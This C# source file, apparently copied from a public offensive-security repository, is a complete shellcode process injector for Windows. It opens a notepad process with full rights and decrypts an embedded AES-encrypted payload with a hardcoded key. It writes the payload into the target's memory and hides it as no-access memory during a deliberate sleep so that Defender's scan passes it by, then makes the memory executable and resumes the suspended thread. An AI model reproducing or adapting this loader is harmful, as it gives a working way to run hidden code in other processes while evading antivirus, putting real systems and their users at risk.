
// Stolen from https://github.com/plackyhacker/SuspendedThreadInjection

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;
            
            // get the pid of the notepad process - this can be any process you have the rights to
            // you could even spawn a surregate process if you like
            int pid = Process.GetProcessesByName("notepad")[0].Id;

            Debug("[+] OpenProcess with PID {0}.", new string[] { pid.ToString() });

            // get a handle to the explorer process
            // 0x001F0FFF = PROCESS_ALL access right
            hProcess = OpenProcess(0x001F0FFF, false, pid);

            // NOTE: change these to your own payload and key
            // https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/README.md
            
            // the encrypted payload and key
            string payload = "2rxlOpkiE4Ms0EpxfD5chEiZk/j/zOoVY4Ajzv4KV4AzhzJ9IwvyclX9u2sYzdVj6Pa+b77WKCgzagvp7qwUVvV1Hrijaqc3LiBd/9IsJ//TBjVl2ZrgwB3bcVOhvJKsnQYmvoj7TOSF1hVYlVmEwRS2oI+0/RFTJ9sbyT+P/CmZ5rqOIRKyftuufnMaJ0HjINK8asWw6yJGArAV3PaI9swXnC6juAGDstdlAAzcpGvfsSrIQYDKHcOJ8qGRMat0nfF1ipaZF+M2MkHVH5kg4ULDvYgcshLxnMmNJvSPjY2QCyvyxBcgTrGQ0vxVAUM8VY/gKDV4zh52C5D2sPOOViOjYYLHGgIfJmAQZICLYw1dyHWQ01/iovZ1B2IHrOFiTT3I3unInASJ+8h3DIphgxZU4Dk9CNXdSGg5y6j8QdZVDuObrfbQpTh8buGsN/RYlwEGrF3O44YsPLxwcjhPmMfvC8ZogkPSMdSO/ZrIoh9CMuy5NtAGLleVy/JYIWx0IsUFoZREgniC0+UF75rb+yOzInKN7eHeOOry9k+itwx0D1L6+Zs9ZRZVNusEklDoXxuuK/Hbyu6CdzLOpBb1/KyaQrUK5lPwx+uHnZUweqORJJ9bY3kDdoV8IcKL9f180JZaY6rCf8alh7jyDH5/nPj4xVbiXZRbpc1ePNWAkf1LSIGxRGwzu+hw0nnPdfMCMYXkjh6zVds4ucUM5hmuB9tFy9+DClYF/wFnblNDIhuN75I1uxF7lubYkLoVih6UpNcMbPgArrvtX5zmAQzYC8yGk9MWIhu6R9IsA3Kvrj3ejcaOn6bnxFmetQaLrh/GMXIN2UeQNbf0I/nPQWikRBo9tK14uXvQ2q7ql74aTqCBBwTJqBUOjYjqla/na35ZSgIzmKIV6jtdz3XWZNUSgbqbQSVO0NpD+bolgDZOTX0QZNsFW7RU3jwYurZdkwmUZUcIOm6KpIl+txs28DR/QgRlTuehDvTfL1MjdSvhFHk=";
            string key = "Z6ZWn15Y3tQ0GnAc0OPy6K0p0rWItIbO";

            // decrypt the payload
            byte[] buf = Decrypt(key, payload);

            Debug("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}.", new string[] { hProcess.ToString("X") });

            // allocate memory in the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Debug("[+] WriteProcessMemory to 0x{0}.", new string[] { addr.ToString("X") });

            // write buf[] to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            Debug("[+] VirtualProtectEx (PAGE_NO_ACCESS) on 0x{0}.", new string[] { addr.ToString("X") });

            VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x01, out uint lpflOldProtect);

            Debug("[+] CreateRemoteThread (suspended) to 0x{0}.", new string[] { addr.ToString("X") });

            // create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            Debug("[+] Sleeping whilst Defender scans the remote process.", null);

            // let Defender scan the remote process - hopefully not accessing our PAGE_NO_ACCESS memory
            System.Threading.Thread.Sleep(10000);

            Debug("[+] VirtualProtectEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}.", new string[] { addr.ToString("X") });

            // change memory protection to PAGE_EXECUTE_READ_WRITE
            // 0x40 = PAGE_EXECUTE_READ_WRITE
            VirtualProtectEx(hProcess,addr, (UIntPtr)buf.Length, 0x40, out lpflOldProtect);

            Debug("[+] Resume thread 0x{0}.", new string[] { hThread.ToString("X") });

            // resume malicious thread
            ResumeThread(hThread);
        }

        /// <summary>
        /// Decrypts a base64 text string into a byte array using AES256
        /// </summary>
        /// <param name="key">The key to decrypt the payload</param>
        /// <param name="aes_base64">The encrypted base64 string</param>
        /// <returns>A decrypted byte array</returns>
        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        /// <summary>
        /// Returns a sub byte array from a given array
        /// </summary>
        /// <param name="a">The input array</param>
        /// <param name="length">The length of the array to return</param>
        /// <returns>The sub array</returns>
        private static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }

        public static void Debug(string text, string[] args)
        {
            #if DEBUG
            Console.WriteLine(text, args);
            #endif
        }
    }
}
